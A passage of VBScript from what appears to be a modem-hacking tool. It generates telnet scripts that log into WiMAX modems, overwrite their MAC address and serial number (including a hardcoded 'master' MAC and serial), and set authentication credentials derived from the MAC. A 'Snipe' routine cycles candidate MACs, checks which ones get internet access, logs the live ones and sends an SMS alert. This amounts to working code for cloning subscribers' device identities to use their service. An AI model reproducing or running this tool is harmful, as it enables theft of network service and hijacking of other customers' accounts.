Source.WriteLine ("WAIT "& chr(34) &"diag reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"diag reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub 
Sub TstCmnd622i2010Restore(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag set macaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag restore default\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"diag restore default"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''2011
Sub TstCmnd622i2011Restore(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai macdizhi " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag restore default\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"diag restore default"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''end 2011
''2011 REBOOT
Sub TstCmnd622i2011Reboot(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai macdizhi " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag reboot\m"& chr(34)&"") 'REBOOT
Source.WriteLine ("WAIT "& chr(34) &"diag reboot"& chr(34)&"") 'REBOOT
''Source.WriteLine ("WAIT "& chr(34) &"d "& chr(34)&"") 'REBOOT
'Source.WriteLine ("SEND "& chr(34) &"diag restore default\m"& chr(34)&"") 'RESTORE
'Source.WriteLine ("WAIT "& chr(34) &"diag restore default"& chr(34)&"") 'RESTORE
'Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''end 2011 REBOOT
''BEGIN Custom MAC and Serial 2011 NOT YET TEST ONLY
Sub TstCmnd622i2011RebootSerial(tstInputCmndFile)	
masterSerial = "500807778001023836"
mastertMac = "00:25:68:9C:45:2A"
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai serialnum " &masterSerial & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai macdizhi " &mastertMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag reboot\m"& chr(34)&"") 'REBOOT
Source.WriteLine ("WAIT "& chr(34) &"diag reboot"& chr(34)&"") 'REBOOT
''Source.WriteLine ("WAIT "& chr(34) &"d "& chr(34)&"") 'REBOOT
'Source.WriteLine ("SEND "& chr(34) &"diag restore default\m"& chr(34)&"") 'RESTORE
'Source.WriteLine ("WAIT "& chr(34) &"diag restore default"& chr(34)&"") 'RESTORE
'Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''BEGIN Custom MAC and Serial 2011
''BEGIN MASTER MAC 2011
Sub TstCmnd622i2011MasterMacReboot(tstInputCmndFile)	
masterSerial = "500807778001023836"
mastertMac = "00:25:68:9C:45:2A"
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai serialnum " &masterSerial & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai macdizhi " &mastertMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag reboot\m"& chr(34)&"") 'REBOOT
Source.WriteLine ("WAIT "& chr(34) &"diag reboot"& chr(34)&"") 'REBOOT
''Source.WriteLine ("WAIT "& chr(34) &"d "& chr(34)&"") 'REBOOT
'Source.WriteLine ("SEND "& chr(34) &"diag restore default\m"& chr(34)&"") 'RESTORE
'Source.WriteLine ("WAIT "& chr(34) &"diag restore default"& chr(34)&"") 'RESTORE
'Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''END MASTER MAC 2011
Sub TstCmnd621Restore(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setmacaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"restoredef\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''
''dv235tSecurityOnly BEGIN
Sub TstCmndDv235tChangeSecurityOnly(currentMac,tstInputCmndFile)	
authUserName = ""
authUserPass = ""
naiUserName = ""
If radiobtnDv235tG.checked Then
authUserName = inputDomainPassword.value & drpDwnNaiDomain.value
authUserPass = inputDomainPassword.value
naiUserName = inputNai.value & drpDwnNaiDomain.value
Else
authUserName = inputDomainPassword.value
authUserPass = inputDomainPassword.value
naiUserName = inputNai.value & drpDwnNaiDomain.value
End If

set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wimax\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth username " &authUserName & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &authUserPass & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth a-id " &naiUserName & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
If radiobtnDv235tG.checked Then
Source.WriteLine ("SEND "& chr(34) &"wmx auth auto-prepend enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth ignore-cv enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Else 
Source.WriteLine ("SEND "& chr(34) &"wmx auth auto-prepend disable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth ignore-cv disable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
End if
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"logout\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Logout"& chr(34)&"")
Source.Close
set objFSO = Nothing
Set Source = Nothing
End Sub
''dv235tSecurityOnly END
''
''dv235tFreqAdd BEGIN
Sub TstCmndDv235tAddFreq(currentFreq,tstInputCmndFile)	
freqToAdd = currentFreq &" 10"
freqisALL = False
If currentFreq ="Allsmart" Or currentFreq ="Allglobe" Then
freqisALL = True
End If
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wimax\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
''
If freqisALL Then
If currentFreq ="Allsmart" Then
currentFreq = "2365000 10|2355000 10|2345000 10|2357500 10|2347500 10|2337500 10"
Else 
currentFreq = "2602000 10|2507500 10|2510000 10|2638000 10|2622000 10|2505000 10|2612000 10"
End If
MyStringFreq = (Trim(currentFreq))
MyArrayFreq = Split(MyStringFreq, "|", -1, 1)
MyArrayLengthFreq = UBound(MyArrayFreq)
''MyArray(i)
For i = 0 To MyArrayLengthFreq
Source.WriteLine ("SEND "& chr(34) &"wmx freq add " &MyArrayFreq(i) & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Next

Else
''
Source.WriteLine ("SEND "& chr(34) &"wmx freq add " &freqToAdd & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
''
End If
''
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"logout\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Logout"& chr(34)&"")
Source.Close
set objFSO = Nothing
Set Source = Nothing
End Sub
''dv235tFreqAdd END
''
''dv235tglobe BEGIN
Sub TstCmndDv235tGlobeReboot(currentMac,tstInputCmndFile)	
authUserName = inputDomainPassword.value & drpDwnNaiDomain.value
authUserPass = inputDomainPassword.value
naiUserName = inputNai.value & drpDwnNaiDomain.value
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"router\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wan mac " &UCase(currentMac) & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wimax\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth username " &authUserName & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &authUserPass & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth a-id " &naiUserName & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth auto-prepend enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth ignore-cv enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"reboot\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.Close
set objFSO = Nothing
Set Source = Nothing
End Sub
''dv235tglobe END
''
''dv235tglobeChangeSecurity BEGIN
''
Function ChangeSecurityOnlySnipeDv235t (macToTestSnipe,macDomainSnipe)
changeResultGP = 0
macDomainOrigGP = macDomainSnipe
ClearTstCmndInOut 
Sleeper 1000
ConnectToTSTSnipeDv235t macToTestSnipe,macDomainSnipe
''CheckAfter reboot CALL BEGIN
If CheckDv235tAfterReboot = 0 Then
ChangeSecurityOnlySnipeDv235t = 0
Exit Function
End if
''''CheckAfter reboot CALL END
Sleeper 1000
''check internet BEGIN
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogMacGenScan("Stopping process....Ok!")
hdnStopProcessResult.value = "1"
ChangeSecurityOnlySnipeDv235t = changeResultGP
Exit Function
End If
''end if stop
''ping google.com test if connected
''liveCount = 0
macIsLive = "Dead"
'telnetHostLive = False
'hostToPing = "127.0.0.1"
'hostToPing = "192.168.22.1"
''hostToPing = "www.google.com"
DisplayLogMacGenScan("Testing internet connection....")
DisplayLogMacGenScan("PLEASE WAIT while the TESTING is not finish.... Number of tries is: " & snipeTryList.value)
DisplayLogMacGenScan("DO NOT CLOSE the TOOL in this process. Use STOP to cancel process!!!")
Sleeper 10000
''
''begin check internet
''If (liveCount > 0) Then
If CheckInternetSnipe Then
'' end check internet
''appendLiveMacToFile macToTestValue,macDomainValue
appendLiveMacToFile macToTestSnipe,macDomainOrigGP
Sleeper 2000
macIsLive = "Alive"
''liveMacFound = liveMacFound + 1
'ChangeSecurityOnlySnipe = 1
''liveCount = 0
'telnetHostLive = False
If chkEnableSmsSnipe.Checked Then
DisplayLogMacGenScan "SMS/Text Notifier is enabled. Trying to send info.Please Wait......"
msgToSend = Mid(macToTestSnipe,1,8) & " series is ALIVE!!" 
numberTosend = Trim(inputPhone.value)
numberPrefix = liveIPTryList.value
If  numberTosend  <> "1234567" Then
If SendTextSMS(numberPrefix,numberTosend,msgToSend) Then
DisplayLogMacGenScan "Live MAC found SENT.... to " &numberPrefix & numberTosend
Else 
DisplayLogMacGenScan "Failed to Send SMS/text... to " &numberPrefix & numberTosend
End If
Else 
DisplayLogMacGenScan "You did not specifiy the phone number..."
End If
End If 
changeResultGP = 1
End If
''macToTest,macDomain
DisplayLogMacGenScan(macToTestSnipe & " is " & macIsLive & "!!!...." )
Sleeper 1000
'	Exit Sub
''Set macToTestValue = Nothing
''Set macDomainValue = Nothing
checkTryCount = 0
deadCountHost = 0
liveCount = 0
''check internet END
ChangeSecurityOnlySnipeDv235t = changeResultGP 
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Function
End If
End Function
''
Sub ConnectToTSTChangeSecurityOnlyDv235t(deviceMacSec)

''
''
filenameInput =  "TelnetInputCmnd.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
''
DisplayLogChangeMAConly("Preparing to process command...")

TstCmndDv235tChangeSecurityOnly deviceMacSec,tstInputCmndFile

''tstLogCmnd =  "TelnetOutPutCmnd.txt"
filenameOutPut =  "TelnetOutPutCmnd.txt"
tstLogCmnd = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOutPut)
''
Sleeper 1000
'tstCmnd macAddress,tstInputCommand
tsCmnd = "/r:" & Chr(34)& tstInputCmndFile & chr(34) & " /o:" & Chr(34)& tstLogCmnd & chr(34) & " /m"
Sleeper 1000
'tstRunShell = objShellInGen.run ("tst10.exe " & tsCmnd ,0 , 1)
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Trying to Change Security Settings...."
''CreateObject("WScript.Shell").Run "tst10.exe " & tsCmnd ,0 , 1 ''working tst
filename = "tst10.exe"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
''
'filenameExitTst = "exitTst10.vbs"
'currentFolderAndFileExitTst = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameExitTst)
'CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFileExitTst & chr(34),0 , False
ExecuteDLL "wscript","exitTst10.vbs","closeTST"
''
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmnd,0 , True	

End Sub
''
Sub ConnectToTSTaddFreqDv235t
changeMACLog.value = "Status Idle....."
currentFreq = Trim(drpDwnFrequency.value)
DisplayLogChangeMAConly "Frequency to ADD: " & currentFreq &" Khz"
stableMacFusion = Trim(inputChangeMacOneStable.value)
''tstInputCmndFile = "TelnetInputCmnd.txt"
filenameInput =  "TelnetInputCmnd.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
''
DisplayLogChangeMAConly("Preparing to process command...")

TstCmndDv235tAddFreq currentFreq,tstInputCmndFile

''tstLogCmnd =  "TelnetOutPutCmnd.txt"
filenameOutPut =  "TelnetOutPutCmnd.txt"
tstLogCmnd = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOutPut)
''
Sleeper 1000
'tstCmnd macAddress,tstInputCommand
tsCmnd = "/r:" & Chr(34)& tstInputCmndFile & chr(34) & " /o:" & Chr(34)& tstLogCmnd & chr(34) & " /m"
Sleeper 1000
'tstRunShell = objShellInGen.run ("tst10.exe " & tsCmnd ,0 , 1)
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Trying to Add frequency...."
''CreateObject("WScript.Shell").Run "tst10.exe " & tsCmnd ,0 , 1 ''working tst
filename = "tst10.exe"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
''
'filenameExitTst = "exitTst10.vbs"
'currentFolderAndFileExitTst = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameExitTst)
'CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFileExitTst & chr(34),0 , False
ExecuteDLL "wscript","exitTst10.vbs","closeTST"
''
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmnd,0 , True	

End Sub
''
''dv235tglobeConnectTST BEGIN
Sub ConnectToTSTSnipeDv235t(macToTestTst,macDomainTST)
''currentMacSnipe = Trim(inputChangeMacOne.value)
currentMacSnipe = Trim(macToTestTst)
''tstInputCmndFile = "TelnetInputCmnd.txt"
filenameInput =  "TelnetInputCmnd.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
Sleeper 1000

''TstCmnd622i2010RebootSnipe currentMacSnipe,tstInputCmndFile
If radiobtnDv235tG.checked Then
DisplayLogMacGenScan("DV235t: Globe User!")
TstCmndDv235tGlobeRebootSnipe currentMacSnipe,macDomainTST
ElseIf radiobtnDv235tS.checked Then
DisplayLogMacGenScan("DV235t: Smart User!")
TstCmndDv235tSmartRebootSnipe currentMacSnipe,macDomainTST
End If

If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If

filenameOutPut =  "TelnetOutPutCmnd.txt"
tstLogCmnd = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOutPut)
''
Sleeper 1000
''tstCmnd macAddress,tstInputCommand
''tsCmnd = "/r:" & tstInputCmndFile & " /o:" & tstLogCmnd & " /m"
tsCmnd = "/r:" & Chr(34)& tstInputCmndFile & chr(34) & " /o:" & Chr(34)& tstLogCmnd & chr(34) & " /m"
''
Sleeper 1000
''tstRunShell = objShellInGen.run ("tst10.exe " & tsCmnd ,0 , 1)
''changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Trying to change MAC address..."
DisplayLogMacGenScan("DV235t: Changing MAC and settings...")
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Sub
End If
''end if stop
'CreateObject("WScript.Shell").Run "tst10.exe " & tsCmnd ,0 , 1 ''working TST
filename = "tst10.exe"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
''
'filenameExitTst = "exitTst10.vbs"
'currentFolderAndFileExitTst = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameExitTst)
'CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFileExitTst & chr(34),0 , False
ExecuteDLL "wscript","exitTst10.vbs","closeTST"
''
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmnd,0 , True	
End Sub
''
''dv235tglobeConnectTST END
''
''TstCmndDSecurityGlobe BEGIN
Sub TstCmndDv235tGlobeRebootSnipe(macToTest,macDomain)
macPassword = ""
macDomainOrig = macDomain
filenameInput =  "TelnetInputCmnd.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
''isTTLS = True
''domainList = "@globetel.com.ph"
MyString = (Trim(macDomain))
MyArray = Split(MyString, ",", -1, 1)
MyArrayLength = UBound(MyArray) +1
''MsgBox MyArrayLength
''If macDomain = "@globelines.com.ph,TLS" Then
''If MyArrayLength = 2 Then
macDomain = MyArray(0)
''macPassword = Trim(generatePassword(macToTest)) 'userid and password
macPassword = Trim(MyArray(2))
Sleeper 1000 
myNai=Replace(macToTest,":","")
Sleeper 1000
macNai =UCase(myNai)

advancePassUidAndPass = Trim(patternPassDropdwnList.value)
getMAcLastLength = Cint(numberOfDigitHexDropdwnList.value)
myCurrenMaclastHex = LCase(Mid(myNai,getMAcLastLength)) '' Return all characters, starting at postion 10

authUserName = macPassword & macDomain  
authUserPass = macPassword
naiUserName = macNai & macDomain 
If chkAdvancePass.Checked Then
''xpass begin
If patternPassDropdwnList.value = "gemtek" Then
authUserName = macNai & macDomain
authUserPass = macNai
Else
authUserName = advancePassUidAndPass & myCurrenMaclastHex & macDomain 
authUserPass = advancePassUidAndPass & myCurrenMaclastHex
End If
''xpass end
End If
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"enable\m"& chr(34)&"")
